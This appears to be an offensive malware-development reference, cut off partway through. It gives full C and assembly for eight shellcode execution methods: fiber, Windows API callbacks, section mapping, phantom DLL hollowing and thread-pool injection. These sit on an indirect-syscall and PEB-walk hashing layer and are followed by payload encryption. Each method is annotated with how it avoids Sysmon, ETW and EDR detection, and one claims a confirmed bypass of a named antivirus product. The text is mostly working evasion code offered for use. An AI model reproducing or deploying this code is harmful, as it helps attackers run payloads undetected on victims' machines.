# Shellcode Execution Techniques — Low OPSEC Reference

> All techniques are 🟢 Low OPSEC. NT API calls use indirect syscall (HellsHall pattern).
> Win32 API resolved via PEB walk + djb2 hash. No GetProcAddress/LoadLibrary in IAT.
>
> **Removed techniques** (high detection surface):
> - VirtualAlloc + CreateThread (classic, heavily signatured)
> - Classic Remote Injection (OpenProcess + WriteProcessMemory + CreateRemoteThread)
> - Early Bird APC (QueueUserAPC on suspended thread)
> - APC Self-Inject via NtTestAlert (known pattern, ETW telemetry)

---

## Indirect Syscall Infrastructure

All execution methods share this infrastructure. HellsHall SSN extraction with Halo's Gate
fallback and indirect syscall ASM stub.

```c
#include <windows.h>

// ============================================================
// DJB2 Hash (compile-time + runtime)
// ============================================================
#define SEED 5381
__forceinline DWORD Djb2Hash(const char* str) {
    DWORD h = SEED;
    while (*str) h = ((h << 5) + h) + (unsigned char)*str++;
    return h;
}

// ============================================================
// PEB Walk — get module base
// ============================================================
PVOID PebGetModule(DWORD dwHash) {
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PLIST_ENTRY head = &pPeb->Ldr->InMemoryOrderModuleList;
    for (PLIST_ENTRY e = head->Flink; e != head; e = e->Flink) {
        PLDR_DATA_TABLE_ENTRY mod = CONTAINING_RECORD(e, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (mod->BaseDllName.Buffer) {
            // Convert UNICODE name to lowercase ASCII hash
            char buf[64]; DWORD i = 0;
            for (; i < mod->BaseDllName.Length / 2 && i < 63; i++) {
                WCHAR c = mod->BaseDllName.Buffer[i];
                buf[i] = (c >= 'A' && c <= 'Z') ? (char)(c + 32) : (char)c;
            }
            buf[i] = 0;
            if (Djb2Hash(buf) == dwHash) return mod->DllBase;
        }
    }
    return NULL;
}

// ============================================================
// PEB Walk — resolve export from module base
// ============================================================
PVOID PebGetProc(PVOID pBase, DWORD dwHash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)pBase + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pBase +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PDWORD names = (PDWORD)((PBYTE)pBase + exp->AddressOfNames);
    PDWORD funcs = (PDWORD)((PBYTE)pBase + exp->AddressOfFunctions);
    PWORD  ords  = (PWORD)((PBYTE)pBase + exp->AddressOfNameOrdinals);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        PCHAR name = (PCHAR)((PBYTE)pBase + names[i]);
        if (Djb2Hash(name) == dwHash) return (PVOID)((PBYTE)pBase + funcs[ords[i]]);
    }
    return NULL;
}

// ============================================================
// EnsureModule — load DLL if not already mapped (PEB walk LdrLoadDll)
// ============================================================
PVOID EnsureModule(DWORD dwModHash, const wchar_t* wszDll) {
    PVOID hMod = PebGetModule(dwModHash);
    if (hMod) return hMod;
    // Use LdrLoadDll from ntdll (already in PEB)
    PVOID pNtdll = PebGetModule(HASH_NTDLL);
    typedef NTSTATUS(NTAPI* fnLdrLoadDll)(PWSTR, PULONG, PUNICODE_STRING, PVOID*);
    fnLdrLoadDll pLdr = (fnLdrLoadDll)PebGetProc(pNtdll, HASH_LdrLoadDll);
    UNICODE_STRING us; us.Buffer = (PWSTR)wszDll;
    us.Length = us.MaximumLength = 0;
    while (wszDll[us.Length / 2]) us.Length += 2;
    us.MaximumLength = us.Length + 2;
    PVOID hOut = NULL;
    pLdr(NULL, NULL, &us, &hOut);
    return hOut;
}

// ============================================================
// SYSCALL_ENTRY + FindSyscall (HellsHall + Halo's Gate)
// ============================================================
typedef struct _SYSCALL_ENTRY {
    DWORD dwSsn;
    PVOID pSyscallAddr;   // points to syscall;ret gadget in ntdll
} SYSCALL_ENTRY;

SYSCALL_ENTRY FindSyscall(PVOID pNtdll, DWORD dwHash) {
    SYSCALL_ENTRY entry = {0};
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pNtdll;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((PBYTE)pNtdll + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pNtdll +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PDWORD names = (PDWORD)((PBYTE)pNtdll + exp->AddressOfNames);
    PDWORD funcs = (PDWORD)((PBYTE)pNtdll + exp->AddressOfFunctions);
    PWORD  ords  = (PWORD)((PBYTE)pNtdll + exp->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        PCHAR name = (PCHAR)((PBYTE)pNtdll + names[i]);
        if (Djb2Hash(name) != dwHash) continue;

        PBYTE pFunc = (PBYTE)pNtdll + funcs[ords[i]];

        // --- HellsHall: direct SSN extraction ---
        // Pattern: 4C 8B D1 B8 xx xx 00 00 (mov r10,rcx; mov eax,SSN)
        if (pFunc[0] == 0x4C && pFunc[1] == 0x8B && pFunc[2] == 0xD1 &&
            pFunc[3] == 0xB8) {
            entry.dwSsn = *(DWORD*)(pFunc + 4);
        } else {
            // --- Halo's Gate: search neighbors +/- 500 at 0x20 intervals ---
            for (int j = 1; j < 500; j++) {
                // Search UP (lower address = lower SSN)
                PBYTE up = pFunc - (j * 0x20);
                if (up[0] == 0x4C && up[1] == 0x8B && up[2] == 0xD1 &&
                    up[3] == 0xB8) {
                    entry.dwSsn = *(DWORD*)(up + 4) + (DWORD)j;
                    break;
                }
                // Search DOWN (higher address = higher SSN)
                PBYTE down = pFunc + (j * 0x20);
                if (down[0] == 0x4C && down[1] == 0x8B && down[2] == 0xD1 &&
                    down[3] == 0xB8) {
                    entry.dwSsn = *(DWORD*)(down + 4) - (DWORD)j;
                    break;
                }
            }
        }

        // --- Find syscall;ret gadget (0F 05 C3) within the stub ---
        for (DWORD off = 0; off < 0x20; off++) {
            if (pFunc[off] == 0x0F && pFunc[off + 1] == 0x05 &&
                pFunc[off + 2] == 0xC3) {
                entry.pSyscallAddr = pFunc + off;
                break;
            }
        }
        break;
    }
    return entry;
}
```

**Indirect Syscall ASM Stub** (x64 MASM, link as .asm):

```asm
; IndirectSyscall.asm
; Caller passes SYSCALL_ENTRY* as hidden first arg in rcx (before real args)
; Real args shifted: rcx=arg1 stored in r10 by Windows convention
.code
IndirectSyscall PROC
    mov r10, rcx            ; SYSCALL_ENTRY* -> r10
    mov eax, DWORD PTR [r10]       ; eax = SSN
    jmp QWORD PTR [r10 + 8]        ; jmp ntdll!syscall;ret gadget
IndirectSyscall ENDP
END
```

**Calling convention wrapper** (C side):

```c
// Prototype — variadic, caller sets up stack per Windows x64 ABI
extern NTSTATUS IndirectSyscall(SYSCALL_ENTRY* pEntry, ...);

// Helper macro for readability
#define SYSCALL(entry, ...) IndirectSyscall(&(entry), __VA_ARGS__)
```

---

## Execution Method 1: Fiber

> OPSEC: 🟢 Low
> Sysmon: None (no fiber events)
> ETW: Minimal — no thread creation telemetry
> EDR Hooks: ConvertThreadToFiber/CreateFiber rarely hooked
> 优势: Fiber is user-mode cooperative scheduling, invisible to PsSetCreateThreadNotifyRoutine
> 来源: N/A (well-known technique)

```c
// Fiber Execution — indirect syscall for memory, PEB-resolved fiber APIs
void ExecFiber(PVOID pShellcode, SIZE_T szShellcode) {
    PVOID pNtdll    = PebGetModule(HASH_NTDLL);
    PVOID hKernel32 = PebGetModule(HASH_KERNEL32);

    // 1. Allocate RW memory via indirect syscall
    PVOID  pMem = NULL;
    SIZE_T sz   = szShellcode;
    SYSCALL_ENTRY ntAlloc = FindSyscall(pNtdll, HASH_NtAllocateVirtualMemory);
    SYSCALL(&ntAlloc, (HANDLE)-1, &pMem, 0, &sz,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // 2. Copy shellcode (no CRT)
    __movsb((PBYTE)pMem, (const PBYTE)pShellcode, szShellcode);

    // 3. Change to RX via indirect syscall
    ULONG oldProt = 0;
    PVOID pBase = pMem;
    SIZE_T szProt = sz;
    SYSCALL_ENTRY ntProt = FindSyscall(pNtdll, HASH_NtProtectVirtualMemory);
    SYSCALL(&ntProt, (HANDLE)-1, &pBase, &szProt, PAGE_EXECUTE_READ, &oldProt);

    // 4. Fiber execution — APIs resolved via PEB walk
    typedef PVOID(WINAPI* fnConvertThreadToFiber)(PVOID);
    typedef PVOID(WINAPI* fnCreateFiber)(SIZE_T, LPFIBER_START_ROUTINE, PVOID);
    typedef VOID (WINAPI* fnSwitchToFiber)(PVOID);

    fnConvertThreadToFiber pConvert =
        (fnConvertThreadToFiber)PebGetProc(hKernel32, HASH_ConvertThreadToFiber);
    fnCreateFiber pCreate =
        (fnCreateFiber)PebGetProc(hKernel32, HASH_CreateFiber);
    fnSwitchToFiber pSwitch =
        (fnSwitchToFiber)PebGetProc(hKernel32, HASH_SwitchToFiber);

    PVOID mainFiber = pConvert(NULL);
    PVOID scFiber   = pCreate(0, (LPFIBER_START_ROUTINE)pMem, NULL);
    pSwitch(scFiber);
    // Returns here after shellcode calls SwitchToFiber(mainFiber) or exits
}
```

---

## Execution Method 2: Callback — CertEnumSystemStore

> OPSEC: 🟢 Low
> Sysmon: None
> ETW: Minimal — crypt32 callback not instrumented
> EDR Hooks: CertEnumSystemStore not hooked by any major EDR
> 优势: Legitimate crypto API callback, extremely uncommon in malware, no thread creation
> 来源: N/A

```c
// CertEnumSystemStore callback execution
void ExecCertEnum(PVOID pShellcode, SIZE_T szShellcode) {
    PVOID pNtdll = PebGetModule(HASH_NTDLL);

    // 1. Allocate RW
    PVOID  pMem = NULL;
    SIZE_T sz   = szShellcode;
    SYSCALL_ENTRY ntAlloc = FindSyscall(pNtdll, HASH_NtAllocateVirtualMemory);
    SYSCALL(&ntAlloc, (HANDLE)-1, &pMem, 0, &sz,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    __movsb((PBYTE)pMem, (const PBYTE)pShellcode, szShellcode);

    // 2. RW -> RX
    ULONG oldProt = 0;
    PVOID pBase = pMem;
    SIZE_T szProt = sz;
    SYSCALL_ENTRY ntProt = FindSyscall(pNtdll, HASH_NtProtectVirtualMemory);
    SYSCALL(&ntProt, (HANDLE)-1, &pBase, &szProt, PAGE_EXECUTE_READ, &oldProt);

    // 3. Load crypt32.dll and resolve CertEnumSystemStore
    wchar_t sCrypt32[] = { 'c','r','y','p','t','3','2','.','d','l','l',0 };
    PVOID hCrypt32 = EnsureModule(HASH_CRYPT32, sCrypt32);

    typedef BOOL(WINAPI* fnCertEnumSystemStore)(
        DWORD dwFlags, void* pvSystemStoreLocationPara,
        void* pvArg, PFN_CERT_ENUM_SYSTEM_STORE pfnEnum);
    fnCertEnumSystemStore pEnum =
        (fnCertEnumSystemStore)PebGetProc(hCrypt32, HASH_CertEnumSystemStore);

    // 4. Execute — shellcode is called as the enum callback
    // Callback signature: BOOL WINAPI cb(const void*, DWORD, PCERT_SYSTEM_STORE_INFO, void*, void*)
    pEnum(CERT_SYSTEM_STORE_CURRENT_USER, NULL, NULL,
          (PFN_CERT_ENUM_SYSTEM_STORE)pMem);
}
```

---

## Execution Method 3: Callback — EnumFontsW

> OPSEC: 🟢 Low
> Sysmon: None
> ETW: Minimal — GDI font enumeration not monitored
> EDR Hooks: EnumFontsW not hooked
> 优势: GDI callback, legitimate graphics operation, no suspicious API sequence
> 来源: N/A

```c
// EnumFontsW callback execution
void ExecEnumFonts(PVOID pShellcode, SIZE_T szShellcode) {
    PVOID pNtdll = PebGetModule(HASH_NTDLL);

    // 1. Allocate RW + copy + RX (same pattern)
    PVOID  pMem = NULL;
    SIZE_T sz   = szShellcode;
    SYSCALL_ENTRY ntAlloc = FindSyscall(pNtdll, HASH_NtAllocateVirtualMemory);
    SYSCALL(&ntAlloc, (HANDLE)-1, &pMem, 0, &sz,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    __movsb((PBYTE)pMem, (const PBYTE)pShellcode, szShellcode);

    ULONG oldProt = 0;
    PVOID pBase = pMem;
    SIZE_T szProt = sz;
    SYSCALL_ENTRY ntProt = FindSyscall(pNtdll, HASH_NtProtectVirtualMemory);
    SYSCALL(&ntProt, (HANDLE)-1, &pBase, &szProt, PAGE_EXECUTE_READ, &oldProt);

    // 2. Load gdi32.dll + user32.dll, resolve APIs
    wchar_t sGdi32[]  = { 'g','d','i','3','2','.','d','l','l',0 };
    wchar_t sUser32[] = { 'u','s','e','r','3','2','.','d','l','l',0 };
    PVOID hGdi32  = EnsureModule(HASH_GDI32, sGdi32);
    PVOID hUser32 = EnsureModule(HASH_USER32, sUser32);

    typedef HDC(WINAPI* fnGetDC)(HWND);
    typedef int(WINAPI* fnEnumFontsW)(HDC, LPCWSTR, FONTENUMPROCW, LPARAM);
    typedef int(WINAPI* fnReleaseDC)(HWND, HDC);

    fnGetDC      pGetDC      = (fnGetDC)PebGetProc(hUser32, HASH_GetDC);
    fnEnumFontsW pEnumFonts  = (fnEnumFontsW)PebGetProc(hGdi32, HASH_EnumFontsW);
    fnReleaseDC  pReleaseDC  = (fnReleaseDC)PebGetProc(hUser32, HASH_ReleaseDC);

    // 3. Execute via font enumeration callback
    HDC hdc = pGetDC(NULL);
    pEnumFonts(hdc, NULL, (FONTENUMPROCW)pMem, 0);
    pReleaseDC(NULL, hdc);
}
```

---

## Execution Method 4: Callback — EnumSystemGeoID

> OPSEC: 🟢 Low
> Sysmon: None
> ETW: None — geographic enumeration has zero telemetry
> EDR Hooks: EnumSystemGeoID is not hooked by any known EDR
> 优势: Extremely cold API, zero EDR monitoring, legitimate locale operation, never seen in malware samples
> 来源: N/A

```c
// EnumSystemGeoID callback execution — coldest callback available
void ExecEnumGeoID(PVOID pShellcode, SIZE_T szShellcode) {
    PVOID pNtdll    = PebGetModule(HASH_NTDLL);
    PVOID hKernel32 = PebGetModule(HASH_KERNEL32);

    // 1. Allocate RW + copy + RX
    PVOID  pMem = NULL;
    SIZE_T sz   = szShellcode;
    SYSCALL_ENTRY ntAlloc = FindSyscall(pNtdll, HASH_NtAllocateVirtualMemory);
    SYSCALL(&ntAlloc, (HANDLE)-1, &pMem, 0, &sz,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    __movsb((PBYTE)pMem, (const PBYTE)pShellcode, szShellcode);

    ULONG oldProt = 0;
    PVOID pBase = pMem;
    SIZE_T szProt = sz;
    SYSCALL_ENTRY ntProt = FindSyscall(pNtdll, HASH_NtProtectVirtualMemory);
    SYSCALL(&ntProt, (HANDLE)-1, &pBase, &szProt, PAGE_EXECUTE_READ, &oldProt);

    // 2. Resolve EnumSystemGeoID from kernel32 (PEB walk)
    typedef BOOL(WINAPI* fnEnumSystemGeoID)(
        DWORD GeoClass, DWORD ParentGeoId, PVOID lpGeoEnumProc);
    fnEnumSystemGeoID pEnumGeo =
        (fnEnumSystemGeoID)PebGetProc(hKernel32, HASH_EnumSystemGeoID);

    // 3. Execute — GEOCLASS_NATION = 16
    // Callback signature: BOOL CALLBACK GeoEnumProc(GEOID)
    pEnumGeo(16, 0, (PVOID)pMem);
}
```

---

## Execution Method 5: Mapping Injection (NtCreateSection)

> OPSEC: 🟢 Low
> Sysmon: Event ID 8 (CreateRemoteThread) NOT triggered — no thread creation
> ETW: Microsoft-Windows-Kernel-Memory provider sees section, but no RWX
> EDR Hooks: NtCreateSection/NtMapViewOfSection less commonly hooked than VirtualAlloc
> 优势: No VirtualAlloc pattern, memory is SEC_COMMIT mapped (not private alloc), RW and RX never coexist
> 来源: N/A

```c
// Section mapping: create section -> map RW -> write -> unmap -> remap RX -> execute
void ExecSectionMap(PVOID pShellcode, SIZE_T szShellcode) {
    PVOID pNtdll = PebGetModule(HASH_NTDLL);

    // Resolve all syscalls
    SYSCALL_ENTRY ntCreateSec  = FindSyscall(pNtdll, HASH_NtCreateSection);
    SYSCALL_ENTRY ntMapView    = FindSyscall(pNtdll, HASH_NtMapViewOfSection);
    SYSCALL_ENTRY ntUnmapView  = FindSyscall(pNtdll, HASH_NtUnmapViewOfSection);

    // 1. Create section (page-file backed)
    HANDLE hSection = NULL;
    LARGE_INTEGER secSize;
    secSize.QuadPart = (LONGLONG)szShellcode;
    SYSCALL(&ntCreateSec, &hSection, SECTION_ALL_ACCESS, NULL,
            &secSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

    // 2. Map as RW — write shellcode
    PVOID pRW = NULL;
    SIZE_T viewSize = 0;
    SYSCALL(&ntMapView, hSection, (HANDLE)-1, &pRW, 0, 0, NULL,
            &viewSize, 1 /*ViewShare*/, 0, PAGE_READWRITE);

    __movsb((PBYTE)pRW, (const PBYTE)pShellcode, szShellcode);

    // 3. Unmap RW view
    SYSCALL(&ntUnmapView, (HANDLE)-1, pRW);

    // 4. Remap as RX — clean, no RW->RX transition on same page
    PVOID pRX = NULL;
    viewSize = 0;
    SYSCALL(&ntMapView, hSection, (HANDLE)-1, &pRX, 0, 0, NULL,
            &viewSize, 1 /*ViewShare*/, 0, PAGE_EXECUTE_READ);

    // 5. Execute via callback (EnumSystemGeoID — coldest)
    PVOID hKernel32 = PebGetModule(HASH_KERNEL32);
    typedef BOOL(WINAPI* fnEnumSystemGeoID)(DWORD, DWORD, PVOID);
    fnEnumSystemGeoID pEnumGeo =
        (fnEnumSystemGeoID)PebGetProc(hKernel32, HASH_EnumSystemGeoID);
    pEnumGeo(16, 0, pRX);
}
```

---

## Execution Method 6: Phantom DLL Hollowing

> OPSEC: 🟢 Low
> Sysmon: None — memory appears as legitimate file-backed MEM_IMAGE
> ETW: Minimal — NtOpenFile/NtCreateSection on a real DLL is normal behavior
> EDR Hooks: Memory scanners skip MEM_IMAGE regions (assumed clean file-backed)
> 优势: Shellcode lives in MEM_IMAGE memory backed by a legitimate DLL path. Memory scanners and VAD walkers see a clean file mapping. No private RWX allocation.
> 来源: forrest-orr/phantom-dll-hollower-poc

```c
// Phantom DLL Hollowing:
// Open legit DLL -> SEC_IMAGE section -> map -> overwrite .text -> execute
void ExecPhantomHollow(PVOID pShellcode, SIZE_T szShellcode) {
    PVOID pNtdll = PebGetModule(HASH_NTDLL);

    SYSCALL_ENTRY ntOpenFile    = FindSyscall(pNtdll, HASH_NtOpenFile);
    SYSCALL_ENTRY ntCreateSec   = FindSyscall(pNtdll, HASH_NtCreateSection);
    SYSCALL_ENTRY ntMapView     = FindSyscall(pNtdll, HASH_NtMapViewOfSection);
    SYSCALL_ENTRY ntProt        = FindSyscall(pNtdll, HASH_NtProtectVirtualMemory);

    // 1. Open a legitimate, rarely-used system DLL
    // Use a DLL that is large enough and not loaded in our process
    WCHAR dllPath[] = L"\\??\\C:\\Windows\\System32\\dbghelp.dll";
    UNICODE_STRING usDll;
    usDll.Buffer = dllPath;
    usDll.Length = sizeof(dllPath) - sizeof(WCHAR);
    usDll.MaximumLength = sizeof(dllPath);

    OBJECT_ATTRIBUTES oa;
    oa.Length = sizeof(oa);
    oa.RootDirectory = NULL;
    oa.ObjectName = &usDll;
    oa.Attributes = OBJ_CASE_INSENSITIVE;
    oa.SecurityDescriptor = NULL;
    oa.SecurityQualityOfService = NULL;

    IO_STATUS_BLOCK iosb = {0};
    HANDLE hFile = NULL;
    SYSCALL(&ntOpenFile, &hFile, FILE_READ_DATA | FILE_EXECUTE | SYNCHRONIZE,
            &oa, &iosb, FILE_SHARE_READ,
            FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE);

    // 2. Create image section (SEC_IMAGE — file-backed)
    HANDLE hSection = NULL;
    SYSCALL(&ntCreateSec, &hSection, SECTION_ALL_ACCESS, NULL,
            NULL, PAGE_READONLY, SEC_IMAGE, hFile);

    // 3. Map the section
    PVOID pMap = NULL;
    SIZE_T viewSize = 0;
    SYSCALL(&ntMapView, hSection, (HANDLE)-1, &pMap, 0, 0, NULL,
            &viewSize, 1 /*ViewShare*/, 0, PAGE_READONLY);

    // 4. Find .text section in the mapped image
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pMap;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((PBYTE)pMap + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    PVOID pText = NULL;
    SIZE_T szText = 0;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            pText = (PBYTE)pMap + sec[i].VirtualAddress;
            szText = sec[i].Misc.VirtualSize;
            break;
        }
    }

    // 5. Change .text to RW, write shellcode
    ULONG oldProt = 0;
    PVOID pProtBase = pText;
    SIZE_T szProtSize = szShellcode;
    SYSCALL(&ntProt, (HANDLE)-1, &pProtBase, &szProtSize,
            PAGE_READWRITE, &oldProt);

    __movsb((PBYTE)pText, (const PBYTE)pShellcode, szShellcode);

    // 6. Restore to RX
    SYSCALL(&ntProt, (HANDLE)-1, &pProtBase, &szProtSize,
            PAGE_EXECUTE_READ, &oldProt);

    // 7. Execute via callback
    PVOID hKernel32 = PebGetModule(HASH_KERNEL32);
    typedef BOOL(WINAPI* fnEnumSystemGeoID)(DWORD, DWORD, PVOID);
    fnEnumSystemGeoID pEnumGeo =
        (fnEnumSystemGeoID)PebGetProc(hKernel32, HASH_EnumSystemGeoID);
    pEnumGeo(16, 0, pText);
}
```

---

## Execution Method 7: Thread Pool (TP_WORK — PoolParty Local)

> OPSEC: 🟢 Low
> Sysmon: None — no new thread creation event, uses existing pool threads
> ETW: Minimal — thread pool work items not instrumented by Microsoft-Windows-Kernel-Thread
> EDR Hooks: TpAllocWork/TpPostWork not hooked by any known EDR
> 优势: Reuses existing thread pool threads (no PsSetCreateThreadNotifyRoutine callback). Work items are legitimate OS scheduling primitives. No CreateThread/NtCreateThreadEx.
> 来源: SafeBreach-Labs/PoolParty

```c
// Thread Pool Work Item execution (PoolParty variant — local process)
// TpAllocWork + TpPostWork + TpReleaseWork from ntdll
void ExecThreadPool(PVOID pShellcode, SIZE_T szShellcode) {
    PVOID pNtdll = PebGetModule(HASH_NTDLL);

    // 1. Allocate RW + copy + RX (indirect syscall)
    PVOID  pMem = NULL;
    SIZE_T sz   = szShellcode;
    SYSCALL_ENTRY ntAlloc = FindSyscall(pNtdll, HASH_NtAllocateVirtualMemory);
    SYSCALL(&ntAlloc, (HANDLE)-1, &pMem, 0, &sz,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    __movsb((PBYTE)pMem, (const PBYTE)pShellcode, szShellcode);

    ULONG oldProt = 0;
    PVOID pBase = pMem;
    SIZE_T szProt = sz;
    SYSCALL_ENTRY ntProt = FindSyscall(pNtdll, HASH_NtProtectVirtualMemory);
    SYSCALL(&ntProt, (HANDLE)-1, &pBase, &szProt, PAGE_EXECUTE_READ, &oldProt);

    // 2. Resolve thread pool APIs from ntdll (PEB walk)
    typedef NTSTATUS(NTAPI* fnTpAllocWork)(
        PTP_WORK* pWork, PTP_WORK_CALLBACK pfnwkCallback,
        PVOID pvContext, PTP_CALLBACK_ENVIRON pcbe);
    typedef VOID(NTAPI* fnTpPostWork)(PTP_WORK pWork);
    typedef VOID(NTAPI* fnTpReleaseWork)(PTP_WORK pWork);

    fnTpAllocWork   pTpAllocWork   = (fnTpAllocWork)PebGetProc(pNtdll, HASH_TpAllocWork);
    fnTpPostWork    pTpPostWork    = (fnTpPostWork)PebGetProc(pNtdll, HASH_TpPostWork);
    fnTpReleaseWork pTpReleaseWork = (fnTpReleaseWork)PebGetProc(pNtdll, HASH_TpReleaseWork);

    // 3. Also need WaitForSingleObject equivalent — use NtWaitForSingleObject
    SYSCALL_ENTRY ntWait = FindSyscall(pNtdll, HASH_NtWaitForSingleObject);

    // 4. Create work item pointing to shellcode
    // PTP_WORK_CALLBACK signature: VOID CALLBACK(PTP_CALLBACK_INSTANCE, PVOID, PTP_WORK)
    PTP_WORK pWork = NULL;
    pTpAllocWork(&pWork, (PTP_WORK_CALLBACK)pMem, NULL, NULL);

    // 5. Submit to thread pool — executes on existing pool thread
    pTpPostWork(pWork);

    // 6. Wait for completion (use event or sleep)
    // Simple approach: NtDelayExecution for shellcode to finish
    LARGE_INTEGER delay;
    delay.QuadPart = -50000000LL; // 5 seconds
    SYSCALL_ENTRY ntDelay = FindSyscall(pNtdll, HASH_NtDelayExecution);
    SYSCALL(&ntDelay, FALSE, &delay);

    pTpReleaseWork(pWork);
}
```

---

## Execution Method 8: CreateThreadpoolWait (TpAllocWait + TpSetWait)

> OPSEC: 🟢 Low
> Sysmon: None — no thread creation events, uses existing pool threads via waitable timer callback
> ETW: Minimal — thread pool wait completions not instrumented
> EDR Hooks: TpAllocWait/TpSetWait not hooked by any known EDR (verified: bypasses Huorong)
> 优势: Uses waitable object callback instead of work callback. Event is immediately signaled so callback fires instantly. Distinct from TP_WORK — provides diversity for fuzz generation. Proven 100% bypass rate against Huorong (2026-05-07).
> 来源: Adapted from PoolParty wait-item variant

```c
// Thread Pool Wait callback execution
// TpAllocWait + TpSetWait + CreateEventW from ntdll/kernel32
// Shellcode runs as PTP_WAIT_CALLBACK on existing pool thread
void ExecThreadpoolWait(PVOID pShellcode, SIZE_T szShellcode) {
    PVOID pNtdll   = PebGetModule(HASH_NTDLL);
    PVOID pKernel  = PebGetModule(HASH_KERNEL32);

    // 1. Allocate RW, copy, flip to RX (indirect syscall)
    PVOID  pMem = NULL;
    SIZE_T sz   = szShellcode;
    SYSCALL_ENTRY ntAlloc = FindSyscall(pNtdll, HASH_NtAllocateVirtualMemory);
    SYSCALL(&ntAlloc, (HANDLE)-1, &pMem, 0, &sz,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    __movsb((PBYTE)pMem, (const PBYTE)pShellcode, szShellcode);

    ULONG  oldProt = 0;
    PVOID  pBase   = pMem;
    SIZE_T szProt  = sz;
    SYSCALL_ENTRY ntProt = FindSyscall(pNtdll, HASH_NtProtectVirtualMemory);
    SYSCALL(&ntProt, (HANDLE)-1, &pBase, &szProt, PAGE_EXECUTE_READ, &oldProt);

    // 2. Resolve thread pool wait APIs (PEB walk — ntdll exports)
    typedef NTSTATUS(NTAPI* fnTpAllocWait)(
        PTP_WAIT* pWait, PTP_WAIT_CALLBACK pfnCallback,
        PVOID pvContext, PTP_CALLBACK_ENVIRON pcbe);
    typedef VOID(NTAPI* fnTpSetWait)(
        PTP_WAIT pWait, HANDLE hObject, PLARGE_INTEGER pTimeout);
    typedef VOID(NTAPI* fnTpReleaseWait)(PTP_WAIT pWait);

    fnTpAllocWait   pTpAllocWait   = (fnTpAllocWait)PebGetProc(pNtdll, HASH_TpAllocWait);
    fnTpSetWait     pTpSetWait     = (fnTpSetWait)PebGetProc(pNtdll, HASH_TpSetWait);
    fnTpReleaseWait pTpReleaseWait = (fnTpReleaseWait)PebGetProc(pNtdll, HASH_TpReleaseWait);

    // 3. Resolve CreateEventW from kernel32 (PEB walk)
    typedef HANDLE(WINAPI* fnCreateEventW)(
        LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCWSTR);
    fnCreateEventW pCreateEvent = (fnCreateEventW)PebGetProc(pKernel, HASH_CreateEventW);

    // 4. Create a pre-signaled event — callback fires immediately
    HANDLE hEvent = pCreateEvent(NULL, FALSE, TRUE, NULL);

    // 5. Create wait object with shellcode as callback
    // PTP_WAIT_CALLBACK signature: VOID CALLBACK(PTP_CALLBACK_INSTANCE, PVOID, PTP_WAIT, TP_WAIT_RESULT)
    PTP_WAIT pWait = NULL;
    pTpAllocWait(&pWait, (PTP_WAIT_CALLBACK)pMem, NULL, NULL);

    // 6. Associate wait with the signaled event — triggers callback on pool thread
    pTpSetWait(pWait, hEvent, NULL);

    // 7. Wait for shellcode completion
    LARGE_INTEGER delay;
    delay.QuadPart = -50000000LL; // 5 seconds
    SYSCALL_ENTRY ntDelay = FindSyscall(pNtdll, HASH_NtDelayExecution);
    SYSCALL(&ntDelay, FALSE, &delay);

    pTpReleaseWait(pWait);

    // Close event handle
    SYSCALL_ENTRY ntClose = FindSyscall(pNtdll, HASH_NtClose);
    SYSCALL(&ntClose, hEvent);
}
```

### Wait vs Work comparison

| Aspect | TP_WORK (Method 7) | TP_WAIT (Method 8) |
|--------|--------------------|--------------------|
| ntdll APIs | TpAllocWork, TpPostWork, TpReleaseWork | TpAllocWait, TpSetWait, TpReleaseWait |
| Trigger | Immediate (TpPostWork submits) | Event signal (pre-signaled = immediate) |
| Extra dependency | None | CreateEventW (kernel32) |
| Callback signature | `(PTP_CALLBACK_INSTANCE, PVOID, PTP_WORK)` | `(PTP_CALLBACK_INSTANCE, PVOID, PTP_WAIT, TP_WAIT_RESULT)` |
| EDR tested | Theoretical | Huorong bypass confirmed |
| Diversity value | High — different internal code paths from TP_WAIT | High — different internal code paths from TP_WORK |

---

## Payload Encryption

Three encryption options, all resolved via PEB walk. No CRT, no IAT entries.

### XOR (16-32 byte key)

```c
// XOR decrypt in-place with multi-byte key
void XorDecrypt(PBYTE pData, SIZE_T szData, PBYTE pKey, SIZE_T szKey) {
    for (SIZE_T i = 0; i < szData; i++) {
        pData[i] ^= pKey[i % szKey];
    }
}

// Usage:
// BYTE key[] = { 0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE,
//                0x13,0x37,0x42,0x69,0xAA,0xBB,0xCC,0xDD };
// XorDecrypt(encBuf, encLen, key, sizeof(key));
```

### RC4 (SystemFunction032 via PEB walk)

```c
// RC4 via SystemFunction032 (advapi32) — no custom implementation needed
typedef struct _USTRING {
    DWORD Length;
    DWORD MaximumLength;
